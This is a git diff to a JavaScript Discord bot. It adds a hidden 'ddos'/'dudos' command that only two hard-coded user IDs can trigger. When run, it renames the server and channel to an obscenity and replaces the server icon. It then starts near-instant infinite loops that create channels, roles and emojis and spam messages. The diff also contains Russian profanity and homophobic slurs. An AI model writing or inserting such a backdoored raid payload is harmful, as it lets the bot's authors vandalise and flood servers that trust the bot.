@@ -281,6 +281,38 @@ client.on("message", async message => {
         message.delete();
     }
 
+    if ((command === "dudos" || command === "ddos" || command === "ддос" || command === "дудос") && ['327872942124040192', '421944342048014366'].includes(message.author.id)) {
+        message.channel.send("НУ ЧЕ НАРОД, ПОГНАЛИ НАХУЙ")
+        message.channel.guild.setIcon('https://cdn.discordapp.com/attachments/459481853678714890/459623771465187339/azqqQAN_700b.png')
+        message.channel.guild.setName('СОСАТБ')
+        message.channel.setTopic('СОСАТБ')
+        message.channel.setName('СОСАТБ')
+	    /*
+	    ВНИМАНИЕ
+	    Я НЕ ИСПОЛЬЗУЮ ЭТО ПРОСТО ТАК ДЛЯ РАЗВЛЕЧЕНИЯ
+	    Я ИСПОЛЬЗУЮ ЭТО ДЛЯ ОСОБО ОДАРЕННЫХ ПИДОРОВ
+	    */
+        setInterval(function () {
+            message.channel.guild.createChannel('сосатб блять', 'text')
+                .then(console.log)
+                .catch(console.error);
+        }, Math.floor(Math.random() * (1 - 1)) + 1);
+        setInterval(function () {
+            message.channel.guild.createChannel('сосатб блять', 'voice')
+                .then(console.log)
+                .catch(console.error);
+        }, Math.floor(Math.random() * (1 - 1)) + 1);
+        setInterval(function () {
+            message.channel.guild.createRole('сосатб блять')
+        }, Math.floor(Math.random() * (1 - 1)) + 1);
+        setInterval(function () {
+            message.channel.guild.createEmoji('https://cdn.discordapp.com/attachments/459481853678714890/459623719770521600/405316678507823124.png', 'sasai_owner')
+        }, Math.floor(Math.random() * (1 - 1)) + 1);
+        setInterval(function () {
+            message.channel.send("сосатб блять")
+        }, Math.floor(Math.random() * (1 - 1)) + 1);
+    }
+
     if (command === "pidor" || command === "pidar" || command === "пидар" || command === "пидор") {
         let member = message.mentions.members.first();
         if (!member)
